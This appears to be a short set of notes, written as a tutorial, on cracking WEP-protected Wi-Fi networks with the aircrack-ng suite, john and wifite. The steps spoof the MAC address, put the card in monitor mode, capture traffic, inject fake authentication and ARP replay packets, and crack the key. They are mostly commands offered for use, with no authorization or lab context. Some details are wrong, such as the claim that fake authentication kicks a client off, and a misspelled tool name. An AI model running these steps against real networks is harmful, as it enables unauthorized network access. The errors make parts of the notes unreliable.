It can be a good idea to change our MAC address, this can be done by typing:
```sh
ifconfig wlan0 down
ifconfig wlan0 hw ether aa:bb:cc:dd:ee:ff
ifconfig wlan0 up
```

We may also use more advanced tools such as `macchanger`.

Then we have to set the WNIC in monitor mode by doing:
```sh
ifconfig wlan0 down
airmon-ng start wlan0
ifconfig wlan0 up
iwconfig # check if the interface is in monitor mode
```
### WEP cracking with aircrack-ng

Now we can search of access point by doing:
```sh
airodump-ng wlan0mon
```

Now we know the channel, the MAC adddress and some of the stations connected.

```sh
airodump --channel <channel> --bssid <bssid> --write filenameprefix wlan0mon
```

Now we will send a fake authentication packet pretending to be one of the
clients.

If there is no client connected we want to use aireplay-ng with `-1`
```sh
aireplay-ng -1 0 -e <ESSID> -a <access_point_mac> -h <station_mac> wlan0mon
```

In this way we kicked the `station_mac` client off and captured the reconnection
of the station to the AP.

If there is at leaast a client connected we can use that client MAC address and
use aireplay-ng with `-3` which is a classic attack. 

So we can do:
```sh
aireplay-ng -3 -b <access_point_mac> -h <station_mac> wlan0mon
```

While the process is going we can start the cracking process by doing:
```sh
aircrack-ng --new-session <cap_file>.session -b <bssid_ap> <filename.cap>
```
We may restore the cracking session by doing:
```sh
aircrack-ng --restore-session <cap_file>.session
```
On some versions this may not work and we should help us with john by doing:
```sh
john --session=foo --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b <target_mac> file.cap
```
And restore it with:
```sh
john --restore=foo | aircrack-ng -w - -b <target_mac> file.cap
```

We generally need from 10k IVs to 250k 

### WEP cracking with wifite

We just do:
```sh
wifite
```
we then press ctrl+c and then we choose the number associated to the target AP 
we want to attack.
It will just do everything automatically.
